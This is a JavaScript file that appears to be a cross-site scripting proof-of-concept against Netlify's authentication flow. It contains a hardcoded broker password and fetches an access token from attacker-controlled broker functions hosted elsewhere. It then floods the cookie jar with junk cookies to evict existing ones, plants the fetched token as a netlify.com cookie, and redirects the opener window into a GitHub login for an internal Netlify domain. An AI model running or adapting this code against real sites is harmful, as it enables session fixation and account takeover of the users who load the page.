// 1. The URL containing the hash
const DASHBOARD_PASSWORD = "XSS-Runners-2026!7Kp4";

const API_HOSTS = {
  custom:
    "https://interactive-custom-control-xss-20261015.netlify.app/.netlify/functions/oauth-broker",
  asset:
    "https://interactive-asset-source-xss-20261015.netlify.app/.netlify/functions/oauth-broker",
  chrome2:
    "https://owned-chrome2-wfui-xss-20261015.netlify.app/.netlify/functions/login-broker"
};

const basicAuth = "Basic " + btoa("proof:" + DASHBOARD_PASSWORD);

async function getSessionUrl(mode = "custom") {
  const url = API_HOSTS[mode];

  const response = await fetch(url, {
    method: "POST",
    credentials: "include",
    cache: "no-store",
    headers: {
      "content-type": "application/json",
      authorization: basicAuth
    },
    body: "{}"
  });

  const data = await response.json().catch(() => ({}));

  if (!response.ok || data.ok === false) {
    throw new Error(data.error || `HTTP ${response.status}`);
  }

  if (data.state === "ready" && data.loginUrl) {
    return data.loginUrl;
  }

  throw new Error("Broker did not return ready login URL");
}

// If you are extracting this directly from the page URL, use:
// const currentHash = window.location.hash;
const url =  await getSessionUrl("chrome2");
const currentHash = url.hash;

// 2. Parse the hash and extract the specific token
const hashParams = new URLSearchParams(currentHash.substring(1));
const token = hashParams.get("access_token");
const attrs = "Path=/";
let prev = -1;

for (let i = 0; i < 400; i++) {
  document.cookie = `junk${i}=${"A".repeat(32)}; ${attrs}`;
  const visible = document.cookie ? document.cookie.split(/; */).length : 0;
  if (visible === prev) break;
  prev = visible;
}

// 3. Set the cookie with the extracted token
if (token) {
  // Define attributes: 
  // - path=/: Available across the whole site
  // - domain=netlify.com: Available on this domain and its subdomains
  // - Secure; SameSite=None: Allows cross-site context (must be HTTPS)
  const cookieOptions = "path=/studio/6acfc3b2b4515ccf9f90a91b; domain=netlify.com; Secure; SameSite=None";
  
  // Construct and set the cookie
  document.cookie = `accessToken=${token}; ${cookieOptions}`;
  
  console.log("Cookie successfully set!");
} else {
  console.error("No access token found in the URL.");
}
opener.window.location="https://api.netlify.com/auth?provider=github&site_id=app.netlify.com&tracking_session_id=aade9842-b8db-45b9-92a4-bd807ffdade1&login=true&redirect=https%3A%2F%2Fmain--www.netlify.com%2Fedge-access%3Fdomain%3Dinternal.netlify.com%26requested_path%3D%252F%26site_id%3D947876e2-b71a-4ce5-88c3-6a4040d6a0b1%26strict_saml%3Dtrue&use_redirect=true"
  
